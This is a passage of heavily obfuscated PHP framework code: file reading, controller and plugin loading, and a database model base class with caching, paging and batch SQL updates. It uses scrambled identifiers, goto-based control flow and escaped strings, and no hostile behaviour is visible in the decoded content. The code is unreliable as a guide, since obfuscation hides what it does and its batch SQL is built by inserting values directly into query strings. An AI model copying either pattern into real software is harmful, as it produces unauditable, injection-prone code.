Exception("\151\x6f\x46\x69\x6c\x65\x52\145\x61\144\x20\145\162\162\x6f\162\41\x20\163\x74\x61\162\164\75{$eŸ…Íº…•}\x3b\x6c\145\156\x67\164\150\75{$eÎñ‡©‹œÎ}\x3b\x20\x73\x69\x7a\145\75{$aÁ–Ä¼ù‚»}\x3b"); } goto BëæŒ×ô; E±ö©œÆè: $bØ»‚‘ŸØÊ = ceil(($eŸ…Íº…• + $eÎñ‡©‹œÎ) / $eàö•ù¦¿™) * $eàö•ù¦¿™ - $dµĞ²Ü¸½; $F¾–“³Œ¦ = IO::fileSubstr($this->path, $dµĞ²Ü¸½, $bØ»‚‘ŸØÊ); $aò‘á­ÕòË[$dµĞ²Ü¸½ . $EÒ‘ÚÚ¥÷½[33]] = $F¾–“³Œ¦; goto eŞœŸÈ„ã; eŞœŸÈ„ã: ksort($aò‘á­ÕòË); $CÂ•İ‰†íí = substr($F¾–“³Œ¦, $eŸ…Íº…• - $dµĞ²Ü¸½, $eÎñ‡©‹œÎ); return $CÂ•İ‰†íí; goto C›—ùÂœÚ; C›—ùÂœÚ: } private function log($EÖô‹‰ÆŠ, $Fîáœã¾À¯) { $B¬š¯·Õ¸¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dÅ×Ò‘£ÈŒ = timeFloat() - $this->timeStart; write_log(sprintf($B¬š¯·Õ¸¢[1309], $EÖô‹‰ÆŠ, $this->info[$B¬š¯·Õ¸¢[28]], $dÅ×Ò‘£ÈŒ, $Fîáœã¾À¯), $B¬š¯·Õ¸¢[1225]); } } goto f‡†©«áÑÈ; CŠà¹óÕÓù: function Action($cá•ƒÏé½ = '') { goto aÚ’ï²Å; EÆ†á Â¢: if (isset($EÓµèÅó¤[$C¼ğ¥¾™Öµ])) { return $EÓµèÅó¤[$C¼ğ¥¾™Öµ]; } $cá•ƒÏé½ = trim(str_replace($Eæ·ÃœĞ’Â[4], $Eæ·ÃœĞ’Â[5], $cá•ƒÏé½), $Eæ·ÃœĞ’Â[4]); $Fè‰–÷ƒ¬¸ = explode($Eæ·ÃœĞ’Â[5], $cá•ƒÏé½); goto eŒÖ”æÜ; eŒÖ”æÜ: $fÀéŞ°œ«„ = strtolower($Fè‰–÷ƒ¬¸[0]); if (substr($fÀéŞ°œ«„, -6) == $Eæ·ÃœĞ’Â[6]) { $cá•ƒÏé½ = substr($Fè‰–÷ƒ¬¸[0], 0, -6); $d¬ò¤áê•í = $cá•ƒÏé½ . $Eæ·ÃœĞ’Â[7]; $cÃ¨÷»¡â™ = $Eæ·ÃœĞ’Â[8]; if (isset($Fè‰–÷ƒ¬¸[1]) && substr(strtolower($Fè‰–÷ƒ¬¸[1]), -5) == $Eæ·ÃœĞ’Â[9]) { $d¬ò¤áê•í = $cá•ƒÏé½ . $Fè‰–÷ƒ¬¸[1]; $cÃ¨÷»¡â™ = $Eæ·ÃœĞ’Â[10] . $Fè‰–÷ƒ¬¸[1] . $Eæ·ÃœĞ’Â[11]; } else { if (count($Fè‰–÷ƒ¬¸) == 3) { $d¬ò¤áê•í = $cá•ƒÏé½ . $Fè‰–÷ƒ¬¸[1] . $Fè‰–÷ƒ¬¸[2]; $cÃ¨÷»¡â™ = $Eæ·ÃœĞ’Â[12] . $Fè‰–÷ƒ¬¸[1] . $Eæ·ÃœĞ’Â[13] . $Fè‰–÷ƒ¬¸[2] . $Eæ·ÃœĞ’Â[11]; } } $cÃ¨÷»¡â™ = PLUGIN_DIR . $cá•ƒÏé½ . $Eæ·ÃœĞ’Â[4] . $cÃ¨÷»¡â™; } else { if (substr($fÀéŞ°œ«„, -5) == $Eæ·ÃœĞ’Â[9]) { $cá•ƒÏé½ = substr($Fè‰–÷ƒ¬¸[0], 0, -5); return Model($cá•ƒÏé½); } else { $d¬ò¤áê•í = $Fè‰–÷ƒ¬¸[0] . $Fè‰–÷ƒ¬¸[1]; $cÃ¨÷»¡â™ = CONTROLLER_DIR . $Fè‰–÷ƒ¬¸[0] . $Eæ·ÃœĞ’Â[4] . $Fè‰–÷ƒ¬¸[1] . $Eæ·ÃœĞ’Â[14]; } } $E×æï¿Êñ‹ = strtolower($d¬ò¤áê•í); goto bÎ¾ÇºØ©ë; bÎ¾ÇºØ©ë: if (isset($EÓµèÅó¤[$E×æï¿Êñ‹])) { return $EÓµèÅó¤[$E×æï¿Êñ‹]; } if (is_file($cÃ¨÷»¡â™)) { include_once $cÃ¨÷»¡â™; } if (!class_exists($d¬ò¤áê•í)) { return actionCallError("\x5b{$cá•ƒÏé½}\40\75\x3e\x20{$d¬ò¤áê•í}\135\x20\143\x6c\141\x73\x73\40\x6e\x6f\164\40\145\x78\151\163\164\x73\41"); } goto b©—İ‡Á; b©—İ‡Á: $EÓµèÅó¤[$E×æï¿Êñ‹] = new $d¬ò¤áê•í(); $EÓµèÅó¤[$C¼ğ¥¾™Öµ] = $EÓµèÅó¤[$E×æï¿Êñ‹]; return $EÓµèÅó¤[$E×æï¿Êñ‹]; goto dø”ÙÜĞÈ; aÚ’ï²Å: $Eæ·ÃœĞ’Â =& $_SERVER[Êß·®ÍËúû]; static $EÓµèÅó¤ = array(); $C¼ğ¥¾™Öµ = $cá•ƒÏé½; goto EÆ†á Â¢; dø”ÙÜĞÈ: } function ActionApply($A‚Ÿõ×ÁƒÆ, $bÌÕ¹Üá×ø = array()) { goto DÃÊ°¶Ê’; Bñƒ¿–ˆŠ–: $FÊŠ“ƒ’ì– = substr($A‚Ÿõ×ÁƒÆ, 0, $B³œ×Ùóå±); $Cµñï¼Ù‚Ò = substr($A‚Ÿõ×ÁƒÆ, $B³œ×Ùóå± + 1); $bĞšÜĞÙ§Ê = Action($FÊŠ“ƒ’ì–); goto bÂÆ‚¤Ôˆ; DÃÊ°¶Ê’: if (is_array($A‚Ÿõ×ÁƒÆ)) { return call_user_func_array($A‚Ÿõ×ÁƒÆ, $bÌÕ¹Üá×ø); } if (function_exists($A‚Ÿõ×ÁƒÆ)) { return call_user_func_array($A‚Ÿõ×ÁƒÆ, $bÌÕ¹Üá×ø); } $B³œ×Ùóå± = strrpos($A‚Ÿõ×ÁƒÆ, $_SERVER[Êß·®ÍËúû][5]); goto Bñƒ¿–ˆŠ–; bÂÆ‚¤Ôˆ: if (!method_exists($bĞšÜĞÙ§Ê, $Cµñï¼Ù‚Ò)) { return actionCallError("{$A‚Ÿõ×ÁƒÆ}\x20\x6d\145\164\x68\157\144\40\x6e\x6f\x74\x20\145\170\151\163\164\x73\41"); } $BëŞ›‡Ğ‘¹ = call_user_func_array(array($bĞšÜĞÙ§Ê, $Cµñï¼Ù‚Ò), $bÌÕ¹Üá×ø); return $BëŞ›‡Ğ‘¹; goto c…ßÏğ›œÈ; c…ßÏğ›œÈ: } function actionCallError($eô—¯´ç¾„) { $dš†›¯Ó×‘ =& $_SERVER[Êß·®ÍËúû]; $AŒµ°Ô„ƒó = json_encode_force(array($dš†›¯Ó×‘[15] => this_url(), $dš†›¯Ó×‘[16] => $GLOBALS[$dš†›¯Ó×‘[16]])); $AŒµ°Ô„ƒó = str_replace(array($dš†›¯Ó×‘[17]), array($dš†›¯Ó×‘[4]), $AŒµ°Ô„ƒó); return write_log($eô—¯´ç¾„ . $dš†›¯Ó×‘[18] . $AŒµ°Ô„ƒó, $dš†›¯Ó×‘[19]); } goto dÅ¯‚«ÍîŞ; FÀ°ÂÁåæ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\x69\x6d\x65", "\164\151\155\x65", "\151\156\163\145\162\164\x2c\165\x70\x64\x61\164\x65", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\x63\x72\x65\141\x74\x65\124\151\155\x65", "\164\x69\155\x65", "\x69\x6e\x73\x65\162\x74", "\146\165\x6e\143\x74\151\157\x6e")); public function setDataAuto($ağƒê­ÍÒ) { $this->dataAuto = $ağƒê­ÍÒ; } public function __construct($DœÌÇ‰¯ğá = '', $bˆİöÇÒ·½ = '', $eÇ‡ÊŒæº = '') { parent::__construct($DœÌÇ‰¯ğá, $bˆİöÇÒ·½, $eÇ‡ÊŒæº); } public static function textEncode($Eí‰®½”ƒ‡) { if (!$Eí‰®½”ƒ‡) { return $Eí‰®½”ƒ‡; } $AƒÒ¾î‰¿ = json_encode($Eí‰®½”ƒ‡); $AƒÒ¾î‰¿ = preg_replace_callback($_SERVER[³‘’¼äÑ™ÔÍ][342], function ($eÂŒŒ³Ğ’») { return addslashes($eÂŒŒ³Ğ’»[0]); }, $AƒÒ¾î‰¿); return json_decode($AƒÒ¾î‰¿); } public static function textDecode($bÃ¼¨Áù…ä) { $e‡Æ¸ˆ˜ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b¿³¬»Ãá = json_encode($bÃ¼¨Áù…ä); $b¿³¬»Ãá = preg_replace_callback($e‡Æ¸ˆ˜ø[343], function ($aÏË’À‹¹²) { return $_SERVER[³‘’¼äÑ™ÔÍ][93]; }, $b¿³¬»Ãá); return json_decode($b¿³¬»Ãá); } protected $tableMeta = array(); protected function _beforeInsert(&$bÎ×åä‰‰, $fÌÉ¿©òİò) { $B˜ÄÏÑˆÒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->checkDataAutoHas($B˜ÄÏÑˆÒ[344])) { return; } $this->dataBeforeFilter($bÎ×åä‰‰, $B˜ÄÏÑˆÒ[344]); } protected function _beforeUpdate(&$F¸Åµâµ…ä, $bï»Ã˜²–­) { $b­Ÿ°Äœù =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->checkDataAutoHas($b­Ÿ°Äœù[345])) { return; } $this->dataBeforeFilter($F¸Åµâµ…ä, $b­Ÿ°Äœù[345]); } protected function _afterSelect(&$b§®²‡Åâî, $C‘Œå«Ì”Ã) { if (!is_array($b§®²‡Åâî)) { return; } if (!$this->checkDataAutoHas($_SERVER[³‘’¼äÑ™ÔÍ][346])) { return; } foreach ($b§®²‡Åâî as &$DÁ†Ïß›‚) { $this->dataAfterFilter($DÁ†Ïß›‚); } } protected function _afterFind(&$aËá„ƒˆ„£, $a Ï‡º†ƒà) { if (!is_array($aËá„ƒˆ„£)) { return; } if (!$this->checkDataAutoHas($_SERVER[³‘’¼äÑ™ÔÍ][346])) { return; } $this->dataAfterFilter($aËá„ƒˆ„£); } public function setAutoIncrement($cÆª¢â¬Í) { $A£¹ÉÃ×õŠ = array($this->getPk() => $cÆª¢â¬Í); $F •ñ¢„ÃÑ = $this->data($A£¹ÉÃ×õŠ)->add(); if ($F •ñ¢„ÃÑ) { $this->delete($F •ñ¢„ÃÑ); } } public function getAutoIncrement() { $DªÇŸ¶‡´È = $this->getTableName(); $aŒÄîŒ¿©ô = $this->max($this->getPk()); $B”ÔÂ¹£… = $this->query("\163\150\x6f\x77\x20\x74\141\x62\x6c\145\x20\163\x74\141\164\x75\163\x20\167\150\x65\162\145\40\116\x61\x6d\x65\x3d\47{$DªÇŸ¶‡´È}\47"); $fŠİÓÒØ = $B”ÔÂ¹£…[0][$_SERVER[³‘’¼äÑ™ÔÍ][347]]; $A»¦‹´ŞÀ• = max($aŒÄîŒ¿©ô, $fŠİÓÒØ); return $A»¦‹´ŞÀ•; } protected function _callBefore($fÅÌ”çÈ£Ğ, $cœµäåóŒ) { return $this->cacheCallCheck($fÅÌ”çÈ£Ğ, $cœµäåóŒ, !1); } protected function _callAfter($fáßñ˜œĞê, $BŠÛöĞ²Åƒ) { return $this->cacheCallCheck($fáßñ˜œĞê, $BŠÛöĞ²Åƒ, !0); } protected function cacheFunctionAlias($c÷—áØÃÆ­) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($fê‘ã·àß¤, $d·è±§»´, $Añ‡¥àÒ÷ = false) { $A…®ÛöÌ¤ = $this->cacheFunctionAlias($d·è±§»´); if (!$A…®ÛöÌ¤) { return; } foreach ($A…®ÛöÌ¤ as $eØëÁêãŠÀ => $D¯ã¼·ÏäË) { $A¥„ùÑªë = $D¯ã¼·ÏäË[0]; $C£ù­ƒŒï¹ = explode($_SERVER[³‘’¼äÑ™ÔÍ][47], $D¯ã¼·ÏäË[1]); if ($fê‘ã·àß¤ == $eØëÁêãŠÀ) { return $this->cacheFunctionGet($eØëÁêãŠÀ, $A¥„ùÑªë); } if ($Añ‡¥àÒ÷ && in_array($fê‘ã·àß¤, $C£ù­ƒŒï¹)) { $this->cacheFunctionClear($eØëÁêãŠÀ, $A¥„ùÑªë); } } } public function cacheFunctionGet($FõÀò¼à¬, $DùÜÊÄ„ç‹) { $eˆ•Úğ›ëš = $this->cacheKeyMake($FõÀò¼à¬, $DùÜÊÄ„ç‹); $f„İËµ»ğ = Cache::get($eˆ•Úğ›ëš); if (!is_array($f„İËµ»ğ)) { $f„İËµ»ğ = call_user_func_array(array($this, $FõÀò¼à¬), array($DùÜÊÄ„ç‹, !0)); Cache::set($eˆ•Úğ›ëš, $f„İËµ»ğ); } return $f„İËµ»ğ; } public function cacheFunctionClear($BÓ‘ï’ÒËÈ, $cÑë°Ô¢ğ) { $dË©ô—øö† = $cÑë°Ô¢ğ; if (!is_array($cÑë°Ô¢ğ)) { $dË©ô—øö† = array($cÑë°Ô¢ğ); } foreach ($dË©ô—øö† as $E«÷íÑ ¡‘) { $E„½òºïº¦ = $this->cacheKeyMake($BÓ‘ï’ÒËÈ, $E«÷íÑ ¡‘); Cache::remove($E„½òºïº¦); } } private function cacheKeyMake($cÛğØßŠ·, $FŞÒ–¼Ø¦‘) { $cƒˆôàÔß =& $_SERVER[³‘’¼äÑ™ÔÍ]; return get_class($this) . $cƒˆôàÔß[70] . $cÛğØßŠ· . $cƒˆôàÔß[348] . $FŞÒ–¼Ø¦‘; } protected function selectPage($B••…£Ç = 200, $DÅ¸ÙÂêœ¸ = 1) { goto Bã“œ‚Æğ¦; CñÍ×ÉŠ˜Š: $this->optionsValue($fİ…Ã…‰‰); $bŠíŒ¨Ú˜Õ = $this->page($DÅ¸ÙÂêœ¸, $B••…£Ç)->select(); $bŠíŒ¨Ú˜Õ = is_array($bŠíŒ¨Ú˜Õ) ? $bŠíŒ¨Ú˜Õ : array(); goto Dôƒ‡·Ã…ö; Eˆ¡²ä¼°¤: $E»ò§Ü»øÅ = 4000; $B••…£Ç = isset($in[$D¹“·«¹[349]]) ? $in[$D¹“·«¹[349]] : $B••…£Ç; if ($B••…£Ç === -1) { unset($in[$D¹“·«¹[349]]); $E»ò§Ü»øÅ = 100000000; $B••…£Ç = $E»ò§Ü»øÅ; } goto f‘˜­ÅÎÏ; eê¹¸íÀ–‹: $Aæ¥Á« ‘Í = ceil($E›µœ¦‡Åö / $B••…£Ç); $DÅ¸ÙÂêœ¸ = intval(isset($in[$D¹“·«¹[340]]) ? $in[$D¹“·«¹[340]] : $DÅ¸ÙÂêœ¸); $DÅ¸ÙÂêœ¸ = $DÅ¸ÙÂêœ¸ <= 1 ? 1 : ($DÅ¸ÙÂêœ¸ >= $Aæ¥Á« ‘Í ? $Aæ¥Á« ‘Í : $DÅ¸ÙÂêœ¸); goto CñÍ×ÉŠ˜Š; eğ‚ŒÒØÂ“: $E›µœ¦‡Åö = intval($this->count()); $B••…£Ç = intval($B••…£Ç); $B••…£Ç = $B••…£Ç <= 5 ? 5 : ($B••…£Ç >= $E»ò§Ü»øÅ ? $E»ò§Ü»øÅ : $B••…£Ç); goto eê¹¸íÀ–‹; Bã“œ‚Æğ¦: $D¹“·«¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; global $in; $fİ…Ã…‰‰ = $this->optionsValue(); goto Eˆ¡²ä¼°¤; Dôƒ‡·Ã…ö: if ($Aæ¥Á« ‘Í == 1) { $E›µœ¦‡Åö = count($bŠíŒ¨Ú˜Õ); } $B¬Ğø«œ¥ = array($D¹“·«¹[351] => array($D¹“·«¹[352] => $E›µœ¦‡Åö, $D¹“·«¹[349] => $B••…£Ç, $D¹“·«¹[340] => $DÅ¸ÙÂêœ¸, $D¹“·«¹[353] => $Aæ¥Á« ‘Í), $D¹“·«¹[354] => $bŠíŒ¨Ú˜Õ ? $bŠíŒ¨Ú˜Õ : array()); return $B¬Ğø«œ¥; goto AÌ„´êßãÍ; f‘˜­ÅÎÏ: $Cø¯Šƒ©‰Û = $fİ…Ã…‰‰; $Cø¯Šƒ©‰Û[$D¹“·«¹[350]] = array(); $this->optionsValue($Cø¯Šƒ©‰Û); goto eğ‚ŒÒØÂ“; AÌ„´êßãÍ: } protected function checkLength($D®»®á•, $E˜ƒÆñèŸÜ = 0, $e¯Ğ¾®ê™‘ = '') { $dìÒ¾ÇŸ“¥ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E˜ƒÆñèŸÜ = $E˜ƒÆñèŸÜ ? $E˜ƒÆñèŸÜ : 65536; if (!$D®»®á• || strlen($D®»®á•) < $E˜ƒÆñèŸÜ) { return; } $e¯Ğ¾®ê™‘ = $e¯Ğ¾®ê™‘ ? $e¯Ğ¾®ê™‘ . $dìÒ¾ÇŸ“¥[67] : $dìÒ¾ÇŸ“¥[33]; show_json($e¯Ğ¾®ê™‘ . LNG($dìÒ¾ÇŸ“¥[355]) . "\50{$E˜ƒÆñèŸÜ}\51", !1); } protected function metaSet($D™ÕÌƒµ…Á, $dÍè¬«Â¦ = null, $Aïá‰Ü¨¨  = null) { goto eÊôÇ¾©®µ; bè…çØî™¾: $f¾÷ŒµèÕº = $this->tableMeta[$e¶Ï¬¾†Û[357]]; $cƒš·å˜é = Model($f¾÷ŒµèÕº); $Cí´’ƒ²™í = array($FäŞÉ¿•æ¯ => $D™ÕÌƒµ…Á, $e¶Ï¬¾†Û[358] => $dÍè¬«Â¦); goto BÕÂµÃé‘¯; eÊôÇ¾©®µ: $e¶Ï¬¾†Û =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->tableMeta) { return !1; } $FäŞÉ¿•æ¯ = $this->tableMeta[$e¶Ï¬¾†Û[356]]; goto bè…çØî™¾; BÕÂµÃé‘¯: if (is_null($dÍè¬«Â¦)) { return $cƒš·å˜é->where(array($FäŞÉ¿•æ¯ => $D™ÕÌƒµ…Á))->delete(); } if (is_null($Aïá‰Ü¨¨ ) && is_string($dÍè¬«Â¦)) { return $cƒš·å˜é->where($Cí´’ƒ²™í)->delete(); } $C³Ö²Ì“™ª = is_array($dÍè¬«Â¦) ? $dÍè¬«Â¦ : array(); goto Eì²¿ë‘É; Eì²¿ë‘É: if (is_string($dÍè¬«Â¦)) { $C³Ö²Ì“™ª[$dÍè¬«Â¦] = $Aïá‰Ü¨¨ ; } $BßäŠÉÂè = array(); foreach ($C³Ö²Ì“™ª as $F£ÑÅÃˆâ¯ => $Eª¹É¨“ ) { $this->checkLength($Eª¹É¨“ , !1, $f¾÷ŒµèÕº . $e¶Ï¬¾†Û[4] . $F£ÑÅÃˆâ¯); $BßäŠÉÂè[] = array($FäŞÉ¿•æ¯ => $D™ÕÌƒµ…Á, $e¶Ï¬¾†Û[89] => $F£ÑÅÃˆâ¯, $e¶Ï¬¾†Û[359] => $Eª¹É¨“ ); } goto dİ’¤ÎğÀÄ; dİ’¤ÎğÀÄ: $cƒš·å˜é->where(array($FäŞÉ¿•æ¯ => $D™ÕÌƒµ…Á))->addAll($BßäŠÉÂè, array(), !0); return !0; goto C ±Í‚ƒô¸; C ±Í‚ƒô¸: } public function metaGet($dºö„öéİ¢) { goto F¿¾Ê¡Äçì; Aºˆ‚¨åŒŒ: $Bƒ ¼Å‹»Ş = array_to_keyvalue($Bƒ ¼Å‹»Ş, $a ¾èˆ´ÁÄ[89], $a ¾èˆ´ÁÄ[359]); return $Bƒ ¼Å‹»Ş; goto BÚÇºÍš«š; D¤¾ï¤Öâõ: $C¼¸ÛÑíë£ = Model($this->tableMeta[$a ¾èˆ´ÁÄ[357]]); $E¹ˆì­¬„› = array($aØ•Ô…™ğ  => $dºö„öéİ¢); $Bƒ ¼Å‹»Ş = $C¼¸ÛÑíë£->field($a ¾èˆ´ÁÄ[360])->where($E¹ˆì­¬„›)->select(); goto Aºˆ‚¨åŒŒ; F¿¾Ê¡Äçì: $a ¾èˆ´ÁÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->tableMeta) { return array(); } $aØ•Ô…™ğ  = $this->tableMeta[$a ¾èˆ´ÁÄ[356]]; goto D¤¾ï¤Öâõ; BÚÇºÍš«š: } private function checkDataAutoHas($E ö‹ğ‰Ñõ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $fŒğáÊ‹ÉÂ) { if (in_array($E ö‹ğ‰Ñõ, explode($_SERVER[³‘’¼äÑ™ÔÍ][47], $fŒğáÊ‹ÉÂ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E°³ÀŸöÚŸ, $d­ø‹½Ş®ø) { $eºµˆô‚…Õ =& $_SERVER[³‘’¼äÑ™ÔÍ]; foreach ($this->dataAuto as $C©¼‰‡Ä—Ï) { $DˆÀÔƒÇÀ‰ = $C©¼‰‡Ä—Ï[0]; if (!in_array($d­ø‹½Ş®ø, explode($eºµˆô‚…Õ[47], $C©¼‰‡Ä—Ï[2]))) { continue; } switch (trim($C©¼‰‡Ä—Ï[3])) { case $eºµˆô‚…Õ[309]: case $eºµˆô‚…Õ[310]: $A©á„²ì¾¢ = $C©¼‰‡Ä—Ï[1]; $E÷åà§‰¦¨ = isset($C©¼‰‡Ä—Ï[4]) ? (array) $C©¼‰‡Ä—Ï[4] : array(); if ($A©á„²ì¾¢ == $eºµˆô‚…Õ[190] && array_key_exists($DˆÀÔƒÇÀ‰, $E°³ÀŸöÚŸ)) { if (!$E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰]) { unset($E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰]); } break; } if (isset($E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰])) { array_unshift($E÷åà§‰¦¨, $E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰]); } if ($eºµˆô‚…Õ[309] == $C©¼‰‡Ä—Ï[3]) { $E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰] = call_user_func_array($A©á„²ì¾¢, $E÷åà§‰¦¨); } else { $E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰] = call_user_func_array(array(&$this, $A©á„²ì¾¢), $E÷åà§‰¦¨); } break; case $eºµˆô‚…Õ[261]: $E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰] = $E°³ÀŸöÚŸ[$C©¼‰‡Ä—Ï[1]]; break; case $eºµˆô‚…Õ[282]: if (isset($E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰]) && !is_string($E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰])) { $E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰] = json_encode_force($E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰]); } break; case $eºµˆô‚…Õ[311]: if ($E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰] === $eºµˆô‚…Õ[33]) { unset($E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰]); } break; case $eºµˆô‚…Õ[312]: $E°³ÀŸöÚŸ[$DˆÀÔƒÇÀ‰] = $C©¼‰‡Ä—Ï[1]; default: break; } } if ($d­ø‹½Ş®ø == $eºµˆô‚…Õ[344]) { $dœ¼ìºóø = strtolower($this->db->getDbType()); if (strpos($dœ¼ìºóø, $eºµˆô‚…Õ[9]) !== 0) { return; } $B©ºÚ‘£„ª = $this->field(!0)->fields; $cÒÉœ·¬Ú = $B©ºÚ‘£„ª[$eºµˆô‚…Õ[240]]; if (isset($B©ºÚ‘£„ª[$eºµˆô‚…Õ[239]])) { unset($cÒÉœ·¬Ú[$B©ºÚ‘£„ª[$eºµˆô‚…Õ[239]]]); } foreach ($cÒÉœ·¬Ú as $dØ¸›ÊÖÊ => $d­ø‹½Ş®ø) { if (!isset($E°³ÀŸöÚŸ[$dØ¸›ÊÖÊ])) { $E°³ÀŸöÚŸ[$dØ¸›ÊÖÊ] = $eºµˆô‚…Õ[33]; } } } } private function dataAfterFilter(&$C÷„“Áİœœ) { $dÙ‹¾Öƒ¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; foreach ($this->dataAuto as $A«†²¸É‘) { $E–ñ ‡¦Íò = $A«†²¸É‘[0]; if (!in_array($dÙ‹¾Öƒ¹[346], explode($dÙ‹¾Öƒ¹[47], $A«†²¸É‘[2]))) { continue; } if (!isset($C÷„“Áİœœ[$E–ñ ‡¦Íò])) { continue; } switch (trim($A«†²¸É‘[3])) { case $dÙ‹¾Öƒ¹[309]: case $dÙ‹¾Öƒ¹[310]: $BÉ§¹”êÉ = isset($A«†²¸É‘[4]) ? (array) $A«†²¸É‘[4] : array(); array_unshift($BÉ§¹”êÉ, $C÷„“Áİœœ[$E–ñ ‡¦Íò]); if ($dÙ‹¾Öƒ¹[309] == $A«†²¸É‘[3]) { $C÷„“Áİœœ[$E–ñ ‡¦Íò] = call_user_func_array($A«†²¸É‘[1], $BÉ§¹”êÉ); } else { $C÷„“Áİœœ[$E–ñ ‡¦Íò] = call_user_func_array(array(&$this, $A«†²¸É‘[1]), $BÉ§¹”êÉ); } break; case $dÙ‹¾Öƒ¹[261]: $C÷„“Áİœœ[$E–ñ ‡¦Íò] = $C÷„“Áİœœ[$A«†²¸É‘[1]]; break; case $dÙ‹¾Öƒ¹[282]: $BéÈµæ = $C÷„“Áİœœ[$E–ñ ‡¦Íò]; $C÷„“Áİœœ[$E–ñ ‡¦Íò] = json_decode($BéÈµæ, !0); if (is_null($C÷„“Áİœœ[$E–ñ ‡¦Íò])) { $C÷„“Áİœœ[$E–ñ ‡¦Íò] = $BéÈµæ; } break; case $dÙ‹¾Öƒ¹[311]: if ($C÷„“Áİœœ[$E–ñ ‡¦Íò] === $dÙ‹¾Öƒ¹[33]) { unset($C÷„“Áİœœ[$E–ñ ‡¦Íò]); } break; case $dÙ‹¾Öƒ¹[312]: $C÷„“Áİœœ[$E–ñ ‡¦Íò] = $A«†²¸É‘[1]; default: break; } } } public function saveAll($c­âÀŸ™ì) { goto EÒ÷·âë¶Ì; d¨¼¬™Ã¥: $this->chunkEventSet(); goto eÁé»å¹¾Õ; EÁ×Ë®Œ: $aÔº½¸Õ°À = array(); $Fî×áÔ‰õ‡ = count($c­âÀŸ™ì); for ($D™šÙİ‚ó = 0; $D™šÙİ‚ó < $Fî×áÔ‰õ‡; $D™šÙİ‚ó++) { $b†Äì»‹â‘ = $c­âÀŸ™ì[$D™šÙİ‚ó]; if (!is_array($b†Äì»‹â‘) || count($b†Äì»‹â‘) != 4) { continue; } $D³Š½Ñ½Ûî = "\x55\120\x44\101\124\105\40\140{$c‹¶Íô·Õ}\x60\x20\123\x45\124\x20{$b†Äì»‹â‘[2]}\x20\75\x20\x43\x41\x53\105\40{$b†Äì»‹â‘[0]}\40\12"; if ($aÒ·À’ïÊÄ == 0) { $D“‹ ¶Û•Ü = $D³Š½Ñ½Ûî; } $aÔº½¸Õ°À[] = $b—Ë‰ˆ«[113] . $b†Äì»‹â‘[1] . $b—Ë‰ˆ«[113]; $aÒ·À’ïÊÄ++; $D“‹ ¶Û•Ü .= "\x20\127\x48\x45\x4e\x20\47{$b†Äì»‹â‘[1]}\47\x20\x54\110\x45\x4e\x20\47{$b†Äì»‹â‘[3]}\x27\40\xa"; if ($aÒ·À’ïÊÄ == $B±±Ú¥õÜ || $D™šÙİ‚ó == $Fî×áÔ‰õ‡ - 1) { goto fôÏ®›ôÄ; Cø†Â¡•‘Î: $aÒ·À’ïÊÄ = 0; $D“‹ ¶Û•Ü = $D³Š½Ñ½Ûî; $this->chunkEventCheck(count($aÔº½¸Õ°À)); goto f±Â±Ç¯¹; f±Â±Ç¯¹: $aÔº½¸Õ°À = array(); goto Dè´Èˆ²Î; fôÏ®›ôÄ: $bÖ¸–Õø¥á = implode($b—Ë‰ˆ«[47], $aÔº½¸Õ°À); $D“‹ ¶Û•Ü .= "\x20\x45\116\104\40\40\127\x48\x45\122\x45\40{$b†Äì»‹â‘[0]}\40\x49\x4e\x20\50{$bÖ¸–Õø¥á}\x29\x20"; $this->execute($D“‹ ¶Û•Ü); goto Cø†Â¡•‘Î; Dè´Èˆ²Î: } } goto d¨¼¬™Ã¥; fêÅ¶Ÿ©¦£: $c­âÀŸ™ì = is_array($c­âÀŸ™ì) ? $c­âÀŸ™ì : array(); $D“‹ ¶Û•Ü = $b—Ë‰ˆ«[361]; $aÒ·À’ïÊÄ = 0; goto EÁ×Ë®Œ; EÒ÷·âë¶Ì: $b—Ë‰ˆ« =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c‹¶Íô·Õ = $this->tablePrefix . $this->tableName; $B±±Ú¥õÜ = self::SQL_WHERE_IN_CHUNK; goto fêÅ¶Ÿ©¦£; eÁé»å¹¾Õ: } public function saveAllEach($D¥ã ¬„˜´) { $Bá²Ïó½¶Ì =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EòÏñíßÉé = $this->tablePrefix . $this->tableName; foreach ($D¥ã ¬„˜´ as $EÙäŞ³¬Î) { if (!is_array($EÙäŞ³¬Î) || count($EÙäŞ³¬Î) != 4) { continue; } $aæˆ³ó„İõ = $EÙäŞ³¬Î[0] . $Bá²Ïó½¶Ì[362] . $EÙäŞ³¬Î[1] . $Bá²Ïó½¶Ì[113]; $f„âÃœ„ƒ£ = $EÙäŞ³¬Î[2] . $Bá²Ïó½¶Ì[362] . $EÙäŞ³¬Î[3] . $Bá²Ïó½¶Ì[113]; $aÆ­Öèì‹• = 